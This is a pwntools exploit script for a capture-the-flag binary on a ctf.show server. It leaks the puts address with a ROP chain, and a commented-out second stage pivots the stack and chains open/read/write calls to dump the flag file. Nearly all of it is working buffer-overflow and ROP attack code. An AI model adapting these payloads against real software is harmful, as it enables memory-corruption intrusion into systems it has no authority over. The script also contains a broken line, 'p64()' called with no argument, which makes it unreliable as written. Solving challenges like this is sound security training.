from pwn import *

# context(os='linux', arch='i386', log_level='debug')
# p = process('./pwn/CET4')
elf = ELF('./pwn/CET4')
libc = elf.libc
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


# libc = ELF('./pwn/libc-2.30.so')
p = remote('pwn.challenge.ctf.show', 28105)

def jump_over():
    payload = p32(1) + p32(0)
    p.send(payload)


jump_over()
pop_rdi = 0x00000000004013d3
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']
payload = p64(1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
payload = payload.ljust(0x40, b'a') + p64()
p.send(payload)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
print('[+]\033[32m Wow! You got the puts address:\033[0m  \033[1;31m %s \033[0m' % hex(puts_addr))
#
# base_addr = puts_addr - libc.symbols['puts']
# print('[+]\033[32m Wow! You got the libc address:\033[0m  \033[1;31m %s \033[0m' % hex(base_addr))
# open_addr = base_addr + libc.symbols['open']
# read_addr = base_addr + libc.symbols['read']
# write_addr = base_addr + libc.symbols['write']
# bss_addr = elf.bss() + 500
# pop_rsi = base_addr + 0x000000000002709c
# pop_rdx_r12 = base_addr + 0x000000000011c421
# ret = 0x000000000040101a
# leave_ret = 0x000000000040128e
#
# jump_over()
# payload = b'a' * 0x40 + p64(bss_addr) + p64(pop_rsi) + p64(bss_addr) + p64(read_addr) \
#           + p64(pop_rdx_r12) + p64(0x100) + p64(0) + p64(leave_ret)
# p.send(payload)
# sleep(1)
# payload = b'./flag\00a' \
#           + p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(0) + p64(open_addr) \
#           + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx_r12) + p64(0x100) + p64(0) + p64(read_addr) \
#           + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx_r12) + p64(0x100) + p64(0) + p64(write_addr)
# p.send(payload)
# p.sendline(b'cat flag')
# flag = p.recvuntil(b'{')[-8:]
# flag += p.recvuntil(b"}")
# flag = str(flag)[2:-1]
# print('[+]\033[32m Wow! You got the flag:\033[0m  \033[1;31m %s \033[0m' % flag)
p.interactive()
